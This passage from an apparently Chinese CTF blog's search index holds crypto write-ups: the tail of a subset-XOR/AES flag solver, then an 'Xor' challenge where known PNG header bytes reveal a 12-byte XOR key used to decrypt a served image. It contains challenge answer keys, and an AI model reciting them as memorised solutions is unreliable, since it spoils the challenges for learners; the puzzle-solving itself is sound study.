comment">#print(i.rfind('1'))</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>bchoose<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  </pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment">#print(bchoose)</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>r2<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    rre<span class="token operator">=</span><span class="token builtin">bin</span><span class="token punctuation">(</span>r2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    rre<span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rre<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>rre</pre></td></tr><tr><td data-num="38"></td><td><pre>    ii <span class="token operator">=</span> rre<span class="token punctuation">[</span><span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>ii<span class="token operator">==</span><span class="token string">'1'</span> <span class="token keyword">or</span> ii<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        sub<span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">*</span>i</pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token keyword">for</span> z <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="42"></td><td><pre>            <span class="token keyword">if</span> psre<span class="token punctuation">[</span>z<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">==</span>sub<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>                bchoose<span class="token punctuation">[</span>z<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="44"></td><td><pre>                r2<span class="token operator">=</span>r2<span class="token operator">^</span><span class="token builtin">int</span><span class="token punctuation">(</span>ps<span class="token punctuation">[</span>z<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token comment">#print(bchoose)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>i<span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">if</span> bchoose<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        i<span class="token operator">=</span>i<span class="token operator">^</span><span class="token builtin">int</span><span class="token punctuation">(</span>ps<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token comment">#print(i==int(r,10))</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token comment">#print(bin(i))</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token comment">#print(bin(int(r,10)))</span></pre></td></tr><tr><td data-num="54"></td><td><pre>choose<span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    choose<span class="token operator">=</span>choose<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>bchoose<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>choose<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>key<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>choose<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>aes_obj <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre>flag <span class="token operator">=</span> aes_obj<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ef<span class="token punctuation">)</span>  <span class="token comment">#final</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="xor"><a class="anchor" href="#xor">#</a> Xor</h1>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> twisted<span class="token punctuation">.</span>internet <span class="token keyword">import</span> reactor<span class="token punctuation">,</span> protocol</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="4"></td><td><pre> </pre></td></tr><tr><td data-num="5"></td><td><pre>PORT <span class="token operator">=</span> <span class="token number">9013</span></pre></td></tr><tr><td data-num="6"></td><td><pre> </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">import</span> struct</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_bytes_from_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>  </pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>  </pre></td></tr><tr><td data-num="10"></td><td><pre>    </pre></td></tr><tr><td data-num="11"></td><td><pre>KEY <span class="token operator">=</span> <span class="token string">"[CENSORED]"</span></pre></td></tr><tr><td data-num="12"></td><td><pre> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">def</span> <span class="token function">length_encryption_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span>KEY<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre> </pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_magic_png</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    image <span class="token operator">=</span> get_bytes_from_file<span class="token punctuation">(</span><span class="token string">"./sleeping.png"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    encoded_string <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>image<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    key_len <span class="token operator">=</span> length_encryption_key<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">print</span> <span class="token string">'Sending magic....'</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">if</span> key_len <span class="token operator">!=</span> <span class="token number">12</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">return</span> encoded_string </pre></td></tr><tr><td data-num="24"></td><td><pre>    </pre></td></tr><tr><td data-num="25"></td><td><pre> </pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">MyServer</span><span class="token punctuation">(</span>protocol<span class="token punctuation">.</span>Protocol<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">connectionMade</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        resp <span class="token operator">=</span> get_magic_png<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre> </pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">MyServerFactory</span><span class="token punctuation">(</span>protocol<span class="token punctuation">.</span>Factory<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    protocol <span class="token operator">=</span> MyServer</pre></td></tr><tr><td data-num="33"></td><td><pre> </pre></td></tr><tr><td data-num="34"></td><td><pre>factory <span class="token operator">=</span> MyServerFactory<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>reactor<span class="token punctuation">.</span>listenTCP<span class="token punctuation">(</span>PORT<span class="token punctuation">,</span> factory<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>reactor<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>还有一个服务器端口里面塞满了 base</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/03/4b68db6950aa3ce6.png" alt="" /></p>
<p>源码里面说有个 sleeping.png，难道就是 base64 转图片吗</p>
<p>拖到 kali 里试验一下</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/03/b88772f70e5be745.png" alt="" /></p>
<p>不行啊，打不开</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/03/a2ae005b683c0a3e.png" alt="" /></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/03/3a345ce399146664.png" alt="" /></p>
<p>windows 下也不行</p>
<p>010 看一下</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/03/3187eba8a84c6f08.png" alt="" /></p>
<p>唔。。少了头文件</p>
<p>正常 png 是 89 50 开头的</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/03/c551f8d8e8d85269.png" alt="" /></p>
<p>回到题目给的 py 上</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> key_len <span class="token operator">!=</span> <span class="token number">12</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">return</span> encoded_string</pre></td></tr></table></figure><p>这句似乎成了关键语句，除此以外真的再也没有什么和编码，加密什么的有关系的了</p>
<p>那是不是异或呢？png 的文件头异或现有的 12 位文件头；</p>
<p>试一下吧</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x6f</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x4b</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x3f</span></pre></td></tr></table></figure><p>再把这个写入文件里面或许就行了。上网搜了一下类似脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">return</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> l<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre> </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment"># Read the encrypted image as bytearray</span></pre></td></tr><tr><td data-num="8"></td><td><pre>data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># This is our key as bytearray: "WoAh_A_Key!?"</span></pre></td></tr><tr><td data-num="11"></td><td><pre>key <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x6f</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x4b</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'decrypted.png'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file_<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    file_<span class="token punctuation">.</span>write<span class="token punctuation">(</span>xor<span class="token punctuation">(</span>data<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/04/03/521b5834a401b64b.png" alt="" /></p>
<p>好有意思的题目啊。。。</p>
]]></content>
      <categories>
        <category>Write-up</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>crypto整合</tag>
      </tags>
  </entry>
</search>
